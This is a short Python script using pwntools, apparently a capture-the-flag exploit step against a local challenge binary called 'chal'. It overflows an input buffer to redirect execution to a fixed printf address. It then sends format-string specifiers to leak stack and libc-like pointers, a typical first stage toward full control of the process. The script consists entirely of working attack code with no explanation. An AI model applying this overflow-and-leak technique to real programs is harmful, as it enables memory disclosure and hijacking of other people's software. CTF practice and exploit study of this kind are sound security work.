#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.binary=ELF("/work/waf/waf/chal",checksec=False)
context.log_level="error"
PRINTF=0x4010d4
def go(fmt):
    p=process("/work/waf/waf/chal")
    p.recvuntil(b">> ")
    pay=(b"exit"+fmt).ljust(88,b"A")+p64(PRINTF)
    assert len(pay)<=128, len(pay)
    p.send(pay); time.sleep(0.3)
    out=p.recv(timeout=1); p.close(); return out
# short, target libc-ish slots
print("A:", go(b"5=%5$p 6=%6$p 7=%7$p 8=%8$p ")[:200])
print("B:", go(b"11=%11$p 13=%13$p 15=%15$p 17=%17$p ")[:200])
print("C:", go(b"19=%19$p 21=%21$p 23=%23$p 25=%25$p ")[:200])
